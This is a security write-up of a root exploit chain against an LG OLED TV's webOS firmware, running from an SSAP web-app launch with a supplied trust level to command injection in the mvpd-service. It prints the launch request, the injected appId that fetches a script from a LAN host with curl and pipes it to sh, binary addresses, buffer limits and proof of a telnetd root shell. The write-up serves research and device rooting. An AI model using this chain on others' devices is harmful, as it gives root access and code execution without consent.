# Technical write-up

Scope: what was verified on an LG OLED55B6V, firmware `05.70.55`, release `3.4.3-570913`, SDK
reported as `3.4.0`, OTA `HE_DTV_W16K_AFADABAA`.

## 1. Novelty

| Layer | Status |
| :--- | :--- |
| `mvpd-service` command injection | known, public (`mvpd-autoroot`) |
| Root on `05.70.55` / W16K family | known |
| `vendor/addMvpd` / `removeMvpd` callable by a public luna client | known (`luna-send-pub` in `autoroot.sh`) |
| `ssap://webapp/launchWebApp` with a requester-supplied `appInfo` | public LG API |
| `trustLevel: "default"` → `PalmServiceBridge` in the hosted page | **observed here, no public reference found** |
| Web page → MVPD → root, no Developer Mode | **composition, no public reference found** |

No exhaustive search was done. Absence of a public reference is not proof of novelty. The
composition still requires LAN access and an accepted SSAP pairing.

## 2. Delivery path

1. The client pairs over SSAP (TLS 3001) with a manifest that includes `LAUNCH_WEBAPP`.
2. `ssap://webapp/launchWebApp` is called with:

```json
{
  "webAppId": "mvpd<epoch>",
  "webAppUrl": "http://<mac>:8080/page",
  "noLoadingSplash": true,
  "appInfo": {"title": "MVPD delivery", "type": "web", "trustLevel": "default"}
}
```

3. The page is served by the attacking machine and gets `PalmSystem` and `PalmServiceBridge`.
4. The page calls `luna://com.webos.service.mvpd/vendor/addMvpd` with
   `{"appId": "A`curl -s <mac>:<port>|sh`"}`, then `vendor/removeMvpd` with the same appId
   after the first reply.

## 3. Why `trustLevel` matters (isolated test)

Same page, same launch, only `appInfo` varied:

| `appInfo` | `PalmSystem` | `PalmServiceBridge` |
| :--- | :--- | :--- |
| absent | undefined | undefined |
| `{"type":"web"}` | undefined | undefined |
| `{"trustLevel":"default"}` | object | function |
| both fields | object | function |

The decisive field is `trustLevel`, supplied by the requesting SSAP client. The effect of other
trust levels was not tested.

## 4. Inside `mvpd-service` (static, ARM, stripped)

Symbols are present in `.dynsym`:

| Symbol | Address |
| :--- | :--- |
| `interface_mvpd_vendor_addMvpd` | `0x15b4c` |
| `interface_mvpd_vendor_removeMvpd` | `0x15c70` |
| `mvpd_unmarshalAppId` | `0x1474c` |
| `mvpd_checkDebugMode` | `0x14e1c` |
| luna handler `vendor/addMvpd` | `0xdf40` |
| luna handler `vendor/removeMvpd` | `0xddf4` |
| `system()` call | `0x15d16` |
| `"rm -rf %s"` | `.rodata` `0x18838` |

`addMvpd`:

```
path = "/var/lib/mvpd/" + appId        (stack buffer, dest sp+0x2f, frame 0x124)
mkdir("/var/lib/mvpd/", 0755)
mkdir(path, 0755)                       (EEXIST tolerated)
if access(path, F_OK) != 0 -> error 101
```

`removeMvpd`:

```
path = "/var/lib/mvpd/" + appId
if access(path, F_OK) != 0 -> error 102 ("Already removed MVPD"), no system()
sprintf(cmd, "rm -rf %s", path)         (buffer sp+0x120, frame 0x220)
system(cmd)
```

Both handlers read the JSON key `appId` via `mvpd_unmarshalAppId` and pass the string to the
functions above. `mvpd_checkDebugMode` only changes logging.

`vendor/addMvpd` and `vendor/removeMvpd` appear in the `public` group of
`/usr/share/luna-service2/api-permissions.d/compat.api.json` (and in `tv.services` of
`tv.internal.api.json`); the service role allows `inbound: ["*"]`.

## 5. Practical constraints

- appId is a single path component: no `/`.
- `strcpy` destination leaves 245 bytes including the NUL in `addMvpd`.
- A 348-byte appId (the first attempt with a long command) overflows by 103 bytes, crashes the
  service, and the LS2 caller receives `Message status unknown.` This is the explanation for the
  earlier failure and is consistent with later successful runs after the service restarted.
- `curl` accepts `host:port` without a URL scheme, so the fetch-and-exec appId contains no slash:
  `A` + `` `curl -s 192.0.2.20:8080|sh` `` (31 bytes).
- The service environment includes `PATH=/mnt/bsppart/bsp/usr/bin:/usr/sbin:/usr/bin:/sbin:/bin`
  and `XDG_DIR=/tmp/xdg`. `command -v` is not available in this busybox shell.

## 6. Evidence collected

- `uid=0(root) gid=0(root) groups=0(root),10(wheel),506(pulse-access),509(se),777(crashd)`
  returned over HTTP from the payload, attributable to the injected appId.
- `Uid: 0 0 0 0` in `/proc/<mvpd-service pid>/status`.
- Interactive root shell over `telnetd` started by the payload.
- After reboot, `org.webosbrew.hbchannel.service` runs as `Uid: 0` and reports `"root": true`.
- CPU measurement (60 s deltas of `/proc/<pid>/stat`, HZ=100) before/after disabling ACR:
  58.2 % → 47.7 % of one core; `acr2` disappeared.

## 7. Root filesystem facts

- `/` is a read-only overlay (`lowerdir=/mnt/bsppart/bsp:/`).
- `/var` and `/home` are the same ext4 partition, mounted read-write.
- `/etc/init/devmode.conf` runs `start-devmode.sh` only if its LG signature verifies; otherwise it
  deletes `devmode_enabled` and `/media/developer`. Do not create an unsigned
  `start-devmode.sh` on a real TV.
- No boot hook reads `/var/lib/webosbrew/startup.sh` on this firmware; Homebrew Channel's startup
  script therefore only runs on demand.

## 8. Limits

- The pair confirms a process identity, not persistence: persistence is a separate step
  (`payloads/autoroot.sh`).
- The payload is fetched over plain HTTP; the LAN is trusted.
- No packet capture was taken of the TV's outbound telemetry; local ACR assets and enabled
  settings were observed, not transmissions.
